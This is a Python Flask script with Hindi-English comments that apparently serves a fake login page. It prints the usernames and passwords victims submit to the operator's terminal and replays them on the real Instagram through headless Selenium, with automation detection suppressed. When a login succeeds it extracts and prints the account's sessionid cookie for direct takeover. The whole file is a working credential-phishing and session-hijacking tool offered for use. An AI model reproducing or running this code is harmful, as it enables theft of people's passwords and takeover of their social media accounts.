import os
import requests
from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
import time

app = Flask(__name__)

# --- Instagram Login Checker Function (MODIFIED) ---
def check_instagram_login(username, password):
    """
    Yeh function Selenium use karke real Instagram pe login karta hai aur check karta hai ki credentials sahi hain ya nahi.
    """
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Browser ko hide rakhega
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--log-level=3")  # Logs ko kam karega
    chrome_options.add_argument("--disable-blink-features=AutomationControlled") # Ye line add karo
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"]) # Ye bhi add karo
    chrome_options.add_experimental_option('useAutomationExtension', False) # Aur ye bhi

    # Driver ko initialize karna
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})") # Ye line add karo
    except Exception as e:
        print(f"Error initializing WebDriver: {e}")
        return {"status": 0, "session_id": None, "error": "WebDriver setup failed."}

    login_url = "https://www.instagram.com/accounts/login/"
    driver.get(login_url)

    try:
        # Username aur password field dhundhna
        time.sleep(5) # Thoda aur wait karo, pehle 3 tha ab 5 kar do
        username_field = driver.find_element(By.NAME, 'username')
        password_field = driver.find_element(By.NAME, 'password')
        username_field.send_keys(username)
        password_field.send_keys(password)
        password_field.submit()

        # Login hone ka wait karna
        time.sleep(7) # Network speed ke hisab se badha sakte ho, pehle 5 tha ab 7 kar do

        # --- YEH HAI MAIN CHANGE ---
        # Ab hum check karenge ki login successful hai ya nahi
        # Hum check karenge ki "Not Now" button ya profile icon load hua ya nahi
        is_logged_in = False
        try:
            # Pehle "Not Now" button dhundo jo notifications ke liye aata hai
            driver.find_element(By.XPATH, "//button[text()='Not Now']")
            is_logged_in = True
        except:
            # Agar "Not Now" nahi mila, to home feed ka icon dhondo
            try:
                driver.find_element(By.XPATH, "//*[local-name()='svg' and @aria-label='Home']")
                is_logged_in = True
            except:
                # Agar woh bhi nahi mila, to profile picture ke element dhondo
                try:
                    driver.find_element(By.XPATH, "//img[@data-testid='user-avatar']")
                    is_logged_in = True
                except:
                    # Kuch bhi nahi mila, matlab login nahi hua
                    pass

        if is_logged_in:
            # Login successful
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break
            driver.quit()
            return {"status": 1, "session_id": session_id, "error": None}
        else:
            # Login failed
            error_message = "Invalid credentials." # Default message
            try:
                # Galat password hone par error message dhundhne ki koshish karo
                error_element = driver.find_element(By.ID, 'slfErrorAlert')
                if error_element:
                    error_message = error_element.text
            except:
                # Agar element nahi mila to bhi chalenge, default message rahega
                pass
            driver.quit()
            return {"status": 0, "session_id": None, "error": error_message}

    except Exception as e:
        driver.quit()  # Agar koi unexpected error aaye
        return {"status": 0, "session_id": None, "error": f"An error occurred: {e}"}

# Flask Routes (Previous Part)

@app.route('/')
def index():
    """
    Yeh route tumhe local host par login page dikhayega.
    """
    return render_template('login.html')

@app.route('/check', methods=['POST'])
def check_credentials():
    """
    Yeh route form se data lega, terminal par print karega,
    aur phir check_instagram_login function ko call karega.
    """
    username = request.form.get('username')
    password = request.form.get('password')

    # --- Step 1: Data ko terminal par print karna ---
    print("\n" + "="*30)
    print("Naye Credentials Received:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("="*30 + "\n")

    # --- Step 2: Real Instagram pe login check karna ---
    print("Instagram par check kar raha hun... Please wait.")
    result = check_instagram_login(username, password)

    # --- Step 3: Result ko terminal par print karna ---
    print("\n" + "="*30)
    print("Instagram Login Result:")
    if result['status'] == 1:
        print("Status: 1 (SUCCESS - Ye data sahi hai)")
        if result['session_id']:
            print(f"Session ID: {result['session_id']}")
            print("Is session ID ka use karke tum direct Instagram pe ja sakte ho.")
    else:
        print("Status: 0 (FAILED - Ye data galat hai)")
        if result['error']:
            print(f"Reason: {result['error']}")
    print("="*30 + "\n")

    # --- Step 4: User ko response bhejna (optional) ---
    # Yeh user ko ek simple response page dega, jaan boojh kar confuse na ho.
    if result['status'] == 1:
        response_message = "Login successful! Check your terminal for details."
    else:
        response_message = "Login failed. The username or password you entered is incorrect."

    return jsonify({
        "message": response_message,
        "status": result['status']
    })

# --- Main block to run the server ---
if __name__ == '__main__':
    # Server ko start karna
    # '0.0.0.0' ka matlab hai ki ye local network se accessible hoga
    # port 5000 par run karenge
    print("Tool starting...")
    print("Open http://127.0.0.1:5000 in your browser to create the login page.")
    app.run(host='0.0.0.0', port=5000, debug=True)
